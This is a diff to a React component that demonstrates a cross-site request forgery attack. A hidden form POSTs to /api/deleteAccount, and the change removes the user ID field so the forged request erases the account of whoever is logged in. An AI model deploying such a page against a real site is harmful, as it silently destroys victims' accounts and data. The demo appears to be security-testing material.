@@ -5,12 +5,11 @@ import React, { useEffect, useState } from 'react';
 export default function CSRFDemo() {
   const [status, setStatus] = useState("Ready to trigger attack...");
   const [log, setLog] = useState([]);
-
   const addLog = (msg) => setLog(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
 
   const triggerAttack = () => {
     setStatus("Triggering attack...");
-    addLog("Form submission initiated.");
+    addLog(`Form submission initiated...`);
     
     // The actual PoC provided by the user
     const form = document.getElementById('csrf-trigger');
@@ -34,18 +33,19 @@ export default function CSRFDemo() {
       <section style={{ backgroundColor: '#fff5f5', border: '1px solid #ffcccc', borderRadius: '8px', padding: '20px', marginBottom: '30px' }}>
         <h2 style={{ color: '#d32f2f', marginTop: 0 }}>Description</h2>
         <p>
-          This page simulates a malicious website that attempts to perform a state-changing action (deleting an account)
-          on behalf of an authenticated user of the <strong>Royal Fold & Forge</strong> application.
+          This page simulates a malicious website that attempts to perform a <strong>high-impact, destructive action</strong>:
+          permanently deleting a user's account and all their associated data (cart, favorites, and order history).
         </p>
         <p>
           <strong>Target Endpoint:</strong> <code>POST /api/deleteAccount</code>
         </p>
 
         <div style={{ padding: '15px', backgroundColor: '#fff', borderRadius: '4px', border: '1px solid #ddd' }}>
-          <h3>Vulnerability Analysis</h3>
+          <h3>Destructive Vulnerability Analysis (IDOR Fixed)</h3>
           <ul style={{ lineHeight: '1.6' }}>
-            <li><strong>Expected Behavior (Mitigated):</strong> The request should fail because the authentication cookie (<code>token</code>) is marked <code>SameSite=Strict</code>, and the server expects a <code>application/json</code> payload, which standard HTML forms cannot send.</li>
-            <li><strong>Exploitation Goal:</strong> Prove that without these mitigations, a silent form submission could trigger sensitive actions.</li>
+            <li><strong>Exploitation Impact:</strong> In this demonstration, a successful CSRF attack will <strong>permanently erase</strong> the user from the database, including their profile, cart, favorites, and orders.</li>
+            <li><strong>Mitigation:</strong> This endpoint is vulnerable if it lacks CSRF tokens and does not enforce <code>SameSite=Strict</code> on the session cookie.</li>
+            <li style={{ color: '#0984e3' }}><strong>Security Enhancement:</strong> The API now extracts the user identity directly from the session cookie, eliminating the need to guess the target's ID and patching the IDOR vulnerability. The attack now universally targets whomever is logged in.</li>
           </ul>
         </div>
       </section>
@@ -75,7 +75,7 @@ export default function CSRFDemo() {
       {/* The Hidden Form - The Core of the PoC */}
       <div style={{ display: 'none' }}>
         <form id="csrf-trigger" action="/api/deleteAccount" method="POST">
-          <input type="hidden" name="userid" value="target_id" />
+          {/* No inputs needed anymore, the API uses the cookie! */}
         </form>
       </div>
 
